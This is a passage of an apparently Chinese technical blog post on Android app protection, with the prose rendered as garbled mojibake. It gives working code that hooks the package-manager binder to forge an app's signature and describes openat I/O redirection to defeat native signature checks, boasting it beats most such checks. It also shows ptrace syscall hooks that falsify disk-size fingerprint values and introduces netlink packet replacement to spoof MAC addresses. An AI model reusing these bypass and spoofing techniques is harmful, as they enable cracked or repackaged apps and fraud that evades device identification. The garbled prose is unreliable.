class="line">    public final static String SHARK = &quot;Shark&quot;;</span><br><span class="line"></span><br><span class="line">    //åº”ç”¨æ­£ç¡®çš„ç­¾åä¿¡æ¯</span><br><span class="line">    private String SIGN;</span><br><span class="line">    private String appPkgName = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public PmsHookBinderInvocationHandler(Object base, String sign, String appPkgName, int hashCode) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            this.base = base;</span><br><span class="line">            this.SIGN = sign;</span><br><span class="line">            this.appPkgName = appPkgName;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Log.d(SHARK, &quot;error:&quot;+Log.getStackTraceString(e));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">        Log.i(SHARK, method.getName());</span><br><span class="line">        //æŸ¥çœ‹æ˜¯å¦æ˜¯getPackageInfoæ–¹æ³•</span><br><span class="line">        if(&quot;getPackageInfo&quot;.equals(method.getName()))&#123;</span><br><span class="line">            String pkgName = (String)args[0];</span><br><span class="line">            Integer flag = (Integer)args[1];</span><br><span class="line">            //æ˜¯å¦æ˜¯è·å–æˆ‘ä»¬éœ€è¦hook apkçš„ç­¾å</span><br><span class="line">            if(flag == PackageManager.GET_SIGNATURES &amp;&amp; appPkgName.equals(pkgName))&#123;</span><br><span class="line">                //å°†æ„é€ æ–¹æ³•ä¸­ä¼ è¿›æ¥çš„æ–°çš„ç­¾åè¦†ç›–æ‰åŸæ¥çš„ç­¾å</span><br><span class="line">                Signature sign = new Signature(SIGN);</span><br><span class="line">                PackageInfo info = (PackageInfo) method.invoke(base, args);</span><br><span class="line">                info.signatures[0] = sign;</span><br><span class="line">                return info;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return method.invoke(base, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>æ¥è‡ªäº<a href="https://blog.csdn.net/cshao888/article/details/72859470%EF%BC%9A">https://blog.csdn.net/cshao888/article/details/72859470ï¼š</a></p><p>Androidåº”ç”¨uiæ˜¯ç»˜åˆ¶åœ¨ä¸»çº¿ç¨‹ä¸­çš„ï¼Œè¿™ä¸ªçº¿ç¨‹å°±æ˜¯<code>ActivityThread</code>ã€‚</p><p>ä½†å®é™…ä¸Šçœ‹æºç å‘ç°<code>ActivityThread</code>å¹¶æ²¡æœ‰ç»§æ‰¿è‡ªThread,<strong>è€Œæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç±»</strong>ï¼Œåªæ˜¯åœ¨å…¶mainæ–¹æ³•ä¸­å¼€äº†ä¸€ä¸ª<strong>Looper</strong>å¾ªç¯æ¶ˆæ¯ï¼Œ<strong>ä¸æ–­æ¥æ”¶å¤„ç†å‘åˆ°ä¸»çº¿ç¨‹é‡Œé¢çš„æ¶ˆæ¯</strong>ï¼Œæ¯”å¦‚performLaunchActivity</p><p>è€Œ<code>ApplicationThread</code>ä¹Ÿä¸æ˜¯ä¸€ä¸ªThread,<strong>æ˜¯ä¸€ä¸ª<code>Binder</code></strong>,ä¸»è¦<strong>ç”¨äºåº”ç”¨è¿›ç¨‹å’ŒActivityManagerServiceè¿›ç¨‹é—´é€šä¿¡</strong>çš„ã€‚</p><p>æ•´ä¸ªActivityThreadæ¡†æ¶æ˜¯<strong>åŸºäºBinderé€šä¿¡çš„C&#x2F;Sç»“æ„</strong>ï¼Œä»å›¾å¯çŸ¥<code>Server</code>ç«¯æ˜¯<code>ActivityThreadã€ApplicationThread</code></p><p><code>Client</code>æ˜¯<code>AMS</code>ï¼ˆActivityManagerServiceï¼‰ï¼Œè€Œ<code>ApplicationThreadProxy</code>å¯ä»¥çœ‹ä½œAMSä¸­Serverä»£è¡¨ã€‚</p></blockquote><h3 id="Nativeå±‚-svcè¯»å–-data-app-åŒ…å-base-apk-è§£æzip-è§£æé‡Œé¢çš„ç­¾åæ–‡ä»¶ä¿¡æ¯ã€‚"><a href="#Nativeå±‚-svcè¯»å–-data-app-åŒ…å-base-apk-è§£æzip-è§£æé‡Œé¢çš„ç­¾åæ–‡ä»¶ä¿¡æ¯ã€‚" class="headerlink" title="Nativeå±‚ svcè¯»å–&#x2F;data&#x2F;app&#x2F;åŒ…å&#x2F;base.apk è§£æzip è§£æé‡Œé¢çš„ç­¾åæ–‡ä»¶ä¿¡æ¯ã€‚"></a>Nativeå±‚ svcè¯»å–&#x2F;data&#x2F;app&#x2F;åŒ…å&#x2F;base.apk è§£æzip è§£æé‡Œé¢çš„ç­¾åæ–‡ä»¶ä¿¡æ¯ã€‚</h3><p>Javaå±‚æ˜¯é€šè¿‡AMSé€šè®¯è·å–ç­¾åä¿¡æ¯ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨svc openatè¯»å–apkæ–‡ä»¶ ï¼Œ è¿›è¡Œæ‰‹åŠ¨è§£æapk çš„ç­¾å ã€‚ä¸ä¿¡ä»»ç³»ç»ŸApiçš„è§£æç»“æœã€‚è¿™ä¸ªä¹Ÿæ˜¯å¸¸ç”¨çš„æ£€æµ‹ç­¾ååŠæ³•ã€‚è¿™æ ·æ‹¿åˆ°çš„ç»“æœå°±æ˜¯å¯ä¿¡çš„ç»“æœã€‚</p><h4 id="ç»•è¿‡åŸç†ï¼š"><a href="#ç»•è¿‡åŸç†ï¼š" class="headerlink" title="ç»•è¿‡åŸç†ï¼š"></a>ç»•è¿‡åŸç†ï¼š</h4><p>svc openatçš„<code>IOé‡å®šå‘</code>ï¼Œå½“ä»–è¯»å–åŸå§‹&#x2F;data&#x2F;app&#x2F;åŒ…å&#x2F;base.apk çš„æ—¶å€™æˆ‘ä»¬å°†å®ƒä¿®æ”¹æˆåŸå§‹apkçš„è·¯å¾„ã€‚</p><p>è¿™ä¹ˆä¸€æ¥ä»–è¯»å–åˆ°çš„æ˜¯åŸå§‹apkè·¯å¾„ï¼Œè€Œä¸æ˜¯è¢«ä¿®æ”¹çš„è·¯å¾„ï¼Œå¾—åˆ°çš„ç­¾åä¹Ÿå°±æ˜¯åŸå§‹çš„ç­¾åã€‚åº•å±‚åœ¨å¤„ç†ä¸€ä¸‹svc  readlink readlintat é˜²æ­¢æ£€æµ‹è·¯å¾„è¢«æ›¿æ¢ã€‚</p><p><strong>ç”¨è¿™ä¸¤ç§æ–¹æ¡ˆå¯ä»¥ç›®å‰å¹²æ‰å¸‚é¢ä¸Š99%ç­¾åæ£€æµ‹ ã€‚</strong></p><h2 id="è®¾å¤‡æŒ‡çº¹2"><a href="#è®¾å¤‡æŒ‡çº¹2" class="headerlink" title="è®¾å¤‡æŒ‡çº¹2"></a>è®¾å¤‡æŒ‡çº¹2</h2><h3 id="Android-Id"><a href="#Android-Id" class="headerlink" title="Android Id"></a>Android Id</h3><p>è·å–æ–¹å¼</p><h4 id="æ–¹æ³•1ï¼š"><a href="#æ–¹æ³•1ï¼š" class="headerlink" title="æ–¹æ³•1ï¼š"></a>æ–¹æ³•1ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//åŸå§‹è·å–android id</span><br><span class="line">String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);</span><br><span class="line">CLog.i(String.format(&quot;android_id -&gt; 2222 %s&quot;, androidId));</span><br></pre></td></tr></table></figure><h4 id="æ–¹æ³•2ï¼š"><a href="#æ–¹æ³•2ï¼š" class="headerlink" title="æ–¹æ³•2ï¼š"></a>æ–¹æ³•2ï¼š</h4><p>ç¬¬ä¸€ç§è·å–ä»¥åï¼Œç³»ç»Ÿä¼šæŠŠ<code>Android id</code> ä¿å­˜èµ·æ¥ï¼Œä¿å­˜åˆ°ä¸€ä¸ª<code>HashMap</code>é‡Œé¢ï¼Œé˜²æ­¢å¤šæ¬¡<code>IPC</code>åˆå§‹åŒ– ï¼Œæ‰€ä»¥ä¸ºäº†éªŒè¯ç¬¬ä¸€ç§æ–¹æ³•çš„å‡†ç¡®æ€§ï¼Œå¯ä»¥äºŒæ¬¡è·å–<code>cache</code></p><p>9.0ä»¥ä¸Šéœ€è¦ç»•è¿‡<code>Android id</code> çš„åå°„é™åˆ¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//é€šè¿‡åå°„æŸ¥è¯¢android id cache</span></span><br><span class="line"><span class="type">ArrayMap</span> <span class="variable">mValues</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">sNameValueCache</span> <span class="operator">=</span> Settings.Secure.class.getDeclaredField(<span class="string">&quot;sNameValueCache&quot;</span>);</span><br><span class="line">    sNameValueCache.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">sLockSettings</span> <span class="operator">=</span> sNameValueCache.get(<span class="literal">null</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">fieldmValues</span> <span class="operator">=</span> sLockSettings.getClass().getDeclaredField(<span class="string">&quot;mValues&quot;</span>);</span><br><span class="line">      <span class="comment">//sLockSettingsä¸ä»…æ˜¯é™æ€å­—æ®µï¼Œè¿˜æ˜¯ä¸€ä¸ªé™æ€å¯¹è±¡å­—æ®µ</span></span><br><span class="line">    fieldmValues.setAccessible(<span class="literal">true</span>); <span class="comment">//private</span></span><br><span class="line">    mValues = (ArrayMap&lt;String,String&gt;) fieldmValues.get(sLockSettings); </span><br><span class="line">      <span class="comment">//è°ƒç”¨çš„æ˜¯ java.lang.reflect.Field ç±» çš„ get() æ–¹æ³•</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">android_id</span> <span class="operator">=</span> (String)mValues.get(<span class="string">&quot;android_id&quot;</span>);</span><br><span class="line">                                      <span class="comment">//è°ƒç”¨çš„æ˜¯ ArrayMap çš„getæ–¹æ³•</span></span><br><span class="line">    CLog.i(String.format(<span class="string">&quot;android_id -&gt; 3333 %s&quot;</span>, android_id));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è°ƒç”¨ <code>get(null)</code> çš„åŸå› æ˜¯ <code>sNameValueCache</code> è¿™ä¸ªå­—æ®µ (field) æ˜¯ä¸€ä¸ª <strong>é™æ€å­—æ®µ (static field)</strong></p></blockquote><blockquote><ol><li><p><strong><code>fieldmValues</code> æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><ul><li><p>å®ƒçš„ç±»å‹æ˜¯ <code>java.lang.reflect.Field</code>ã€‚</p></li><li><p>ä½ æ˜¯é€šè¿‡ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">fieldmValues</span> <span class="operator">=</span> sLockSettings.getClass().getDeclaredField(<span class="string">&quot;mValues&quot;</span>);</span><br></pre></td></tr></table></figure><p> å¾—åˆ°çš„ã€‚</p></li><li><p>å®ƒæœ¬èº«<strong>ä¸æ˜¯å­—æ®µçš„å€¼</strong>ï¼Œè€Œæ˜¯å­—æ®µçš„ä¸€ä¸ª<strong>æè¿°æˆ–è€…è¯´â€œå¥æŸ„â€</strong>ã€‚å®ƒä»£è¡¨äº† <code>sLockSettings</code> è¿™ä¸ªå¯¹è±¡æ‰€å±çš„ç±»é‡Œé¢çš„é‚£ä¸ªå«åš <code>mValues</code> çš„å­—æ®µã€‚</p></li></ul></li><li><p><strong><code>.get(sLockSettings)</code> æ˜¯åœ¨åšä»€ä¹ˆï¼Ÿ</strong></p><ul><li>è¿™æ˜¯åœ¨è°ƒç”¨ <code>Field</code> å¯¹è±¡çš„ <code>get()</code> æ–¹æ³•ã€‚</li><li>è¿™ä¸ªæ–¹æ³•çš„å«ä¹‰æ˜¯ï¼šâ€œ<strong>è¯·é€šè¿‡æˆ‘ï¼ˆ<code>fieldmValues</code> è¿™ä¸ªå­—æ®µæè¿°ï¼‰å»æŠŠ <code>sLockSettings</code> è¿™ä¸ªå…·ä½“å¯¹è±¡å®ä¾‹é‡Œé¢çš„å­—æ®µå€¼ç»™å–å‡ºæ¥ã€‚</strong>â€</li></ul></li></ol></blockquote><h4 id="æ–¹æ³•3ï¼š"><a href="#æ–¹æ³•3ï¼š" class="headerlink" title="æ–¹æ³•3ï¼š"></a>æ–¹æ³•3ï¼š</h4><p>æ–¹æ³•3ä¹Ÿæ˜¯å¾ˆåŸºç¡€çš„Api ï¼Œä¸»è¦é€šè¿‡<code>ContentResolver</code> è¿›è¡Œé—´æ¥è·å– ã€‚å¾ˆå¤šå¤§å‚ä¹Ÿéƒ½åœ¨ä½¿ç”¨ ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">Bundle</span> <span class="variable">callResult</span> <span class="operator">=</span> context.getContentResolver().call(</span><br><span class="line">            Uri.parse(<span class="string">&quot;content://settings/secure&quot;</span>), <span class="string">&quot;GET_secure&quot;</span>, <span class="string">&quot;android_id&quot;</span>, <span class="keyword">new</span> <span class="title class_">Bundle</span>()</span><br><span class="line">    );</span><br><span class="line">    <span class="type">String</span> <span class="variable">androidIdValue</span> <span class="operator">=</span> callResult.getString(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">    CLog.i(String.format(<span class="string">&quot;android_id -&gt; 1111 %s&quot;</span>, androidIdValue));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    CLog.e(e.toString(), e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong><code>Bundle</code> æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><p> <code>Bundle</code> æ˜¯ Android ä¸­ç”¨äºåœ¨ä¸åŒç»„ä»¶ï¼ˆå¦‚ <code>Activities, Services, Content Providers</code>ï¼‰ä¹‹é—´ä¼ é€’æ•°æ®çš„å…³é”®ç±»ã€‚ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆä¸€ä¸ª <code>Map&lt;String, Object&gt;</code>ï¼Œå®ƒé€šè¿‡é”®å€¼å¯¹ï¼ˆ<code>Key-Value</code>ï¼‰çš„å½¢å¼å­˜å‚¨æ•°æ®ã€‚å®ƒå¯ä»¥å­˜å‚¨å„ç§åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆ<code>String</code>, <code>int</code>, <code>boolean</code>ç­‰ï¼‰ä»¥åŠå¯åºåˆ—åŒ–çš„å¯¹è±¡ã€‚</p><p><code>Bundle</code> ä¹‹æ‰€ä»¥èƒ½è¢«<strong>è·¨è¿›ç¨‹ä¼ é€’</strong>ï¼Œæ˜¯å› ä¸ºå®ƒå®ç°äº† <code>Parcelable</code> æ¥å£ã€‚è¿™ä¸ªæ¥å£å®šä¹‰äº†å¦‚ä½•å°†ä¸€ä¸ªå¯¹è±¡â€œæ‹æ‰â€ï¼ˆ<strong>åºåˆ—åŒ–</strong>&#x2F;ç¼–ç»„ï¼‰æˆä¸€ä¸²å¯è¢«ä¼ è¾“çš„æ•°æ®ï¼Œä»¥åŠå¦‚ä½•ä»è¿™ä¸²æ•°æ®ä¸­æ¢å¤ï¼ˆ<strong>ååºåˆ—åŒ–</strong>&#x2F;è§£ç»„ï¼‰æˆåŸå§‹å¯¹è±¡ã€‚</p><p><strong><code>Bundle</code> æ˜¯æ•°æ®çš„å®¹å™¨</strong></p><p><strong><code>Binder</code> æ˜¯é€šä¿¡çš„é€šé“</strong></p></blockquote><h4 id="æ–¹æ³•4ï¼š"><a href="#æ–¹æ³•4ï¼š" class="headerlink" title="æ–¹æ³•4ï¼š"></a>æ–¹æ³•4ï¼š</h4><p>é€šè¿‡queryå‘½ä»¤å»æŸ¥è¯¢ï¼Œè·å–Android id ï¼Œè¿™ç§æ–¹å¼åº•å±‚èµ°çš„ä¹Ÿæ˜¯<code>ContentResolver</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//é€šè¿‡contentå‘½ä»¤æŸ¥è¯¢android id</span><br><span class="line">String android_id = NativeEngine.popen(</span><br><span class="line">        &quot;content query --uri content://settings/secure --where \&quot;name=\\&#x27;android_id\\&#x27;\&quot;&quot;,</span><br><span class="line">        &quot;&quot;);</span><br><span class="line">CLog.i(String.format(&quot;android_id -&gt; 4444 %s&quot;, android_id));</span><br></pre></td></tr></table></figure><h3 id="ç¡¬ç›˜å­—èŠ‚æ€»å¤§å°"><a href="#ç¡¬ç›˜å­—èŠ‚æ€»å¤§å°" class="headerlink" title="ç¡¬ç›˜å­—èŠ‚æ€»å¤§å°"></a>ç¡¬ç›˜å­—èŠ‚æ€»å¤§å°</h3><p>åœ¨è®¾å¤‡æŒ‡çº¹é‡Œé¢ï¼Œå¦‚æœæƒ³æ¢å¤å‡ºå‚è®¾ç½®ä¹Ÿèƒ½ä¿è¯åŸæœ‰çš„è®¾å¤‡ä¿¡æ¯ ï¼Œè¿™ä¸ªå­—æ®µå¯ä»¥åœ¨æœåŠ¡ç«¯çš„ç›¸ä¼¼åº¦ç®—æ³•é‡Œé¢å æ¯”å¾ˆé‡ ï¼Œå¯ä»¥ä»¥å‹å·è¿›è¡Œåˆ†ç±»ã€‚æˆ‘ä¹‹å‰æµ‹è¯•è¿‡ï¼Œå›å¤å‡ºå‚è®¾ç½®æŒ‡çº¹ä¹Ÿä¸å‘ç”Ÿå˜åŒ–çš„è®¾å¤‡æŒ‡çº¹æ ¸å¿ƒçš„è®¾å¤‡æŒ‡çº¹å°±å‡ ä¸ª</p><p>æ¯”å¦‚<code>ç¡¬ç›˜å¤§å°</code>ï¼Œ<code>ipv6</code> ï¼Œè¿˜æœ‰ä¸€ä¸ªå°±æ˜¯<code>MACåœ°å€</code>ï¼Œè¿™å‡ ä¸ªè®¾å¤‡æŒ‡çº¹ä¹Ÿæ˜¯å¾ˆæ ¸å¿ƒçš„è®¾å¤‡æŒ‡çº¹</p><p>å…ˆä»‹ç»ç¡¬ç›˜å­—èŠ‚å¤§å°ã€‚ ä¹Ÿæ˜¯ä¸‰ç§è·å–æ–¹æ³•ï¼Œä½†æ˜¯<strong>æ–¹æ³•åº•å±‚éƒ½æ˜¯ä¸€æ¡ç³»ç»Ÿè°ƒç”¨</strong>ã€‚æ‰€ä»¥å¦‚æœè¦è¿›è¡Œå¯¹æŠ—çš„è¯ï¼Œåªéœ€è¦åœ¨<strong>SVCå±‚</strong>è¿›è¡Œå¤„ç†å³å¯ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">jclass pJclass = env-&gt;FindClass(&quot;android/os/StatFs&quot;);</span><br><span class="line">jmethodID id = env-&gt;GetMethodID(pJclass, &quot;&lt;init&gt;&quot;, &quot;(Ljava/lang/String;)V&quot;);</span><br><span class="line">jobject pJobject =</span><br><span class="line">        env-&gt;NewObject(pJclass, id, env-&gt;NewStringUTF(&quot;/storage/emulated/0&quot;));</span><br><span class="line"> </span><br><span class="line">jlong i = env-&gt;CallLongMethod(pJobject, env-&gt;GetMethodID(pJclass, &quot;getTotalBytes&quot;, &quot;()J&quot;));</span><br><span class="line">LOG(ERROR) &lt;&lt; &quot;Javaè·å–getTotalBytes &quot;&lt;&lt;i;</span><br><span class="line"></span><br><span class="line">char buffer[1024];</span><br><span class="line">FILE *fp = popen(&quot;stat -f /storage/emulated/0&quot;, &quot;r&quot;);</span><br><span class="line">if (fp != nullptr) &#123;</span><br><span class="line">    while (fgets(buffer, sizeof(buffer), fp) != nullptr) &#123;</span><br><span class="line">        //LOGI(&quot;ps -ef %s&quot;,buffer)</span><br><span class="line">        LOG(INFO) &lt;&lt; &quot;stat -f /storage/emulated/0&quot; &lt;&lt; buffer;</span><br><span class="line">    &#125;</span><br><span class="line">    pclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct statfs64 buf=&#123;&#125;;</span><br><span class="line">if (statfs64(&quot;/storage/emulated/0&quot;, &amp;buf) == -1) &#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; &quot;statfs64ç³»ç»Ÿä¿¡æ¯å¤±è´¥&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_type (æ–‡ä»¶ç³»ç»Ÿç±»å‹): &quot; &lt;&lt; buf.f_type;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_bsize (å—å¤§å°): &quot; &lt;&lt; buf.f_bsize;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_blocks (æ€»æ•°æ®å—): &quot; &lt;&lt; buf.f_blocks;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_bfree (ç©ºé—²å—): &quot; &lt;&lt; buf.f_bfree;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_bavail (éç‰¹æƒç”¨æˆ·å¯ç”¨çš„ç©ºé—²å—): &quot; &lt;&lt; buf.f_bavail;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_files (æ€»æ–‡ä»¶èŠ‚ç‚¹æ•°): &quot; &lt;&lt; buf.f_files;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_ffree (ç©ºé—²æ–‡ä»¶èŠ‚ç‚¹æ•°): &quot; &lt;&lt; buf.f_ffree;</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_fsid (æ–‡ä»¶ç³»ç»Ÿ ID): &quot; &lt;&lt; buf.f_fsid.__val[0] &lt;&lt; &quot;, &quot; &lt;&lt; buf.f_fsid.__val[1];</span><br><span class="line">LOG(INFO) &lt;&lt; &quot;f_namelen (æœ€å¤§æ–‡ä»¶åé•¿åº¦): &quot; &lt;&lt; buf.f_namelen;</span><br></pre></td></tr></table></figure><p>è¿™ä¸‰ç§æ–¹æ³•åº•å±‚èµ°çš„éƒ½æ˜¯<code>statfs64</code>ï¼ˆ<code>arm</code>ï¼‰ æˆ–è€…<code>statfs</code>ï¼ˆ<code>arm64</code>ï¼‰å‡½æ•°ï¼Œå¯¹æŠ—çš„è¯ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥åœ¨<code>statfs64</code> æˆ–è€…<code>statfs</code> çš„<code>after</code>é‡Œé¢å¯¹<strong>å‚æ•°2</strong>è¿›è¡Œæ›¿æ¢å’Œå¤å†™å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">        <span class="comment">//int statfs(const char *path, struct statfs *buf);</span></span><br><span class="line">        <span class="comment">//int statfs64(const char *path, struct statfs64 *buf);</span></span><br><span class="line">        <span class="keyword">case</span> SC_statfs:</span><br><span class="line">        <span class="keyword">case</span> SC_statfs64: &#123;</span><br><span class="line">            <span class="keyword">if</span> (isMockFingerptint()) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((<span class="type">int</span>) syscall_result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//              f_typeï¼šæ–‡ä»¶ç³»ç»Ÿç±»å‹ã€‚</span></span><br><span class="line"><span class="comment">//              f_bsizeï¼šæ–‡ä»¶ç³»ç»Ÿå—çš„å¤§å°ã€‚</span></span><br><span class="line"><span class="comment">//              f_blocksï¼šæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ€»å—æ•°ã€‚</span></span><br><span class="line"><span class="comment">//              f_bfreeï¼šæ–‡ä»¶ç³»ç»Ÿä¸­çš„å¯ç”¨å—æ•°ã€‚</span></span><br><span class="line"><span class="comment">//              f_bavailï¼šéè¶…çº§ç”¨æˆ·å¯è·å–çš„å—æ•°ã€‚</span></span><br><span class="line"><span class="comment">//              f_filesï¼šæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ€»æ–‡ä»¶èŠ‚ç‚¹æ•°ã€‚</span></span><br><span class="line"><span class="comment">//              f_ffreeï¼šæ–‡ä»¶ç³»ç»Ÿä¸­çš„å¯ç”¨æ–‡ä»¶èŠ‚ç‚¹æ•°ã€‚</span></span><br><span class="line"><span class="comment">//              f_fsidï¼šæ–‡ä»¶ç³»ç»Ÿæ ‡è¯†ã€‚</span></span><br><span class="line"><span class="comment">//              f_namelenï¼šæ–‡ä»¶åçš„æœ€å¤§é•¿åº¦ã€‚</span></span><br><span class="line">                <span class="type">char</span> pathBuff[PATH_MAX];</span><br><span class="line">                <span class="type">word_t</span> pPath = peek_reg(tracee, ORIGINAL, SYSARG_1);</span><br><span class="line">                <span class="type">int</span> ret = read_string(tracee, pathBuff, pPath, PATH_MAX);</span><br><span class="line">                <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(get_sysnum(tracee, ORIGINAL) == SC_statfs64)&#123;</span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">statfs64</span> <span class="title">fs</span> =</span> &#123;&#125;;</span><br><span class="line">                    <span class="type">word_t</span> arg2 = peek_reg(tracee, ORIGINAL, SYSARG_2);</span><br><span class="line">                    read_data(tracee,&amp;fs,arg2,<span class="keyword">sizeof</span> (<span class="keyword">struct</span> statfs64));</span><br><span class="line">                    NativeFingerHandler::StatfsHandler64(pathBuff,&amp;fs);</span><br><span class="line">                    write_data(tracee,arg2,&amp;fs,<span class="keyword">sizeof</span> (<span class="keyword">struct</span> statfs64));</span><br><span class="line">                &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">struct</span> statfs fs = &#123;&#125;;</span><br><span class="line">                    <span class="type">word_t</span> arg2 = peek_reg(tracee, ORIGINAL, SYSARG_2);</span><br><span class="line">                    read_data(tracee,&amp;fs,arg2,<span class="keyword">sizeof</span> (<span class="keyword">struct</span> statfs));</span><br><span class="line">                    NativeFingerHandler::StatfsHandler32(pathBuff,&amp;fs);</span><br><span class="line">                    write_data(tracee,arg2,&amp;fs,<span class="keyword">sizeof</span> (<span class="keyword">struct</span> statfs));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="Macåœ°å€"><a href="#Macåœ°å€" class="headerlink" title="Macåœ°å€"></a>Macåœ°å€</h3><p>åŸºç¡€å­—æ®µï¼Œ<strong>Javaå±‚è·å–ï¼Œnetlinkè·å–ï¼Œå‘½ä»¤è¡Œè·å– ï¼Œè¯»æ–‡ä»¶è·å–</strong>ï¼Œå››ç§è·å–æ–¹æ³•</p><p>ç›´æ¥åœ¨svcçš„ <code>recvmsg ï¼Œrecvï¼Œrecvfrom</code>çš„afterè¿›è¡Œæ•°æ®åŒ…æ›¿æ¢å³å¯</p><p>å¦‚æœåˆ¤æ–­æ˜¯<code>netlink</code>çš„æ¶ˆæ¯ï¼Œå¹¶ä¸”æ˜¯è·å–ç½‘å¡ç±»å‹ç›´æ¥å¯¹é‡Œé¢çš„æ•°æ®åŒ…è§£æå’Œæ›¿æ¢å³å¯ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 